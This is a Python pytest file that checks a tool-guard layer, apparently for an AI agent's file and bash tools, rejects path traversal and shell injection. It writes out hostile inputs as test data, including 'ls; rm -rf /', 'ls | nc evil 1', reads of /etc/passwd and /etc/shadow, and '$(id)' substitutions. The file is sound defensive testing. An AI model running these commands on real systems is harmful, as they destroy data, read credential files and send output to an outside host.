"""C4 security tests: path traversal, command injection, schema bypass attempts."""

import pytest

from dhc.cordis.context import Context
from dhc.modules.c4_tool_guard_pipeline.service import apply, ToolSecurityError


@pytest.mark.asyncio
async def test_c4_blocks_path_traversal():
    ctx = Context()
    await apply(ctx)
    tools = ctx.inject("tools")
    with pytest.raises(ToolSecurityError) as excinfo:
        await tools.invoke("read_file", {"path": "../../etc/passwd"})
    assert "Path traversal" in str(excinfo.value) or "Schema violation" in str(excinfo.value)


@pytest.mark.asyncio
async def test_c4_blocks_absolute_etc_path():
    ctx = Context()
    await apply(ctx)
    tools = ctx.inject("tools")
    with pytest.raises(ToolSecurityError):
        await tools.invoke("read_file", {"path": "/etc/passwd"})


@pytest.mark.asyncio
async def test_c4_blocks_shell_metacharacters_via_legacy_schema():
    """The literal audit attack `; rm -rf /` against a string-command tool
    must be rejected at the schema or regex layer."""
    ctx = Context()
    await apply(ctx)
    tools = ctx.inject("tools")
    with pytest.raises(ToolSecurityError):
        await tools.invoke("bash_legacy", {"command": "ls; rm -rf /"})


@pytest.mark.asyncio
async def test_c4_blocks_pipe_and_redirect():
    ctx = Context()
    await apply(ctx)
    tools = ctx.inject("tools")
    for bad in ["ls | nc evil 1", "echo > /etc/x", "cat < /etc/shadow"]:
        with pytest.raises(ToolSecurityError):
            await tools.invoke("bash_legacy", {"command": bad})


@pytest.mark.asyncio
async def test_c4_strict_bash_rejects_command_injection_at_schema():
    """The strict `bash` schema must reject anything that isn't a list of
    safe tokens — including the classic string-injection attempt."""
    ctx = Context()
    await apply(ctx)
    tools = ctx.inject("tools")
    for bad in [
        {"command": "rm -rf /"},
        {"command": "; rm -rf /"},
        {"command": 12345},
        {"command": None},
    ]:
        with pytest.raises(ToolSecurityError):
            await tools.invoke("bash", bad)


@pytest.mark.asyncio
async def test_c4_strict_bash_rejects_embedded_metachars_in_tokens():
    ctx = Context()
    await apply(ctx)
    tools = ctx.inject("tools")
    for bad in [["ls;rm"], ["echo>x"], ["cat|nc"], ["a&b"], ["`whoami`"], ["$(id)"]]:
        with pytest.raises(ToolSecurityError):
            await tools.invoke("bash", {"command": bad})


@pytest.mark.asyncio
async def test_c4_double_registration_rejected():
    ctx = Context()
    await apply(ctx)
    tools = ctx.inject("tools")
    with pytest.raises(ValueError):
        tools.register("read_file", lambda a: a, __import__("pydantic").BaseModel)


@pytest.mark.asyncio
async def test_c4_no_silent_failure_on_executor_exception():
    """Executor exceptions must surface as ToolSecurityError, not be swallowed."""
    ctx = Context()
    await apply(ctx)
    tools = ctx.inject("tools")

    async def boom(args):
        raise RuntimeError("boom")

    from dhc.modules.c4_tool_guard_pipeline.service import ReadFileInput

    tools.register("bomb", boom, ReadFileInput)
    with pytest.raises(RuntimeError):
        await tools.invoke("bomb", {"path": "x"})
